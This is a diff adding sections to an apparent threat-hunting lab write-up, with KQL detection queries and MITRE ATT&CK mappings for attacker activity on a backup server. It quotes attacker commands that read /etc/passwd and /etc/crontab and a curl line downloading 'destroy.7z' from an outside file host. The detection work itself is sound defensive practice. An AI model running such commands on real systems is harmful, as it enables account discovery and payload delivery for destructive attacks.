@@ -131,6 +131,17 @@ Under MITRE ATT&CK T1087.001 (Account Discovery: Local Accounts), local accounts
 
 <img width="943" height="175" alt="image" src="https://github.com/user-attachments/assets/8bb8646e-f82b-449c-b016-cc4fa4786944" />
 
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where DeviceName contains "BackupSrv"
+| where ProcessCommandLine contains "/etc/passwd"
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| project Timestamp, DeviceName, FileName, ProcessCommandLine
+| order by Timestamp dsc
+```
+
 **Notes:** Enumerating local accounts allows attackers to identify privileged users and potential persistence targets.
 
 ---
@@ -139,10 +150,44 @@ Under MITRE ATT&CK T1087.001 (Account Discovery: Local Accounts), local accounts
 
 **Objective**: Identify how backup schedules were discovered.
 
+Under MITRE ATT&CK T1083 (File and Directory Discovery), backup schedules were discovered by executing the command cat **/etc/crontab**. This activity enabled the attacker to review scheduled tasks, including backup jobs, to understand timing and operational patterns that could be leveraged for further attack actions.
+
+<img width="775" height="125" alt="image" src="https://github.com/user-attachments/assets/72226c83-e5c3-41b6-b27c-95c2d6bdb8b3" />
+
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where DeviceName contains "BackupSrv"
+| where ProcessCommandLine contains "cron"
+| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| order by Timestamp dsc
+```
+
+**Notes:** Understanding backup schedules helps attackers time destructive actions for maximum impact.
+
 ---
 
 ##  🚩 Flag 8: External Tool Download
 
 **Objective**: Identify tools downloaded from external infrastructure.
+
+Under MITRE ATT&CK T1105 (Ingress Tool Transfer), an external tool was downloaded using the command **curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z**. This activity indicates the transfer of a potentially malicious archive from external infrastructure to the compromised host for use in subsequent attack stages.
+
+<img width="808" height="140" alt="image" src="https://github.com/user-attachments/assets/20839ffd-69d9-4024-9a04-93bd48bd5974" />
+
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where DeviceName contains "BackupSrv"
+| where FileName in ("curl", "wget")
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
+| order by Timestamp asc
+```
+
+**Notes:** Downloading tools externally confirms preparation for destructive actions rather than opportunistic behavior.
 
 ---
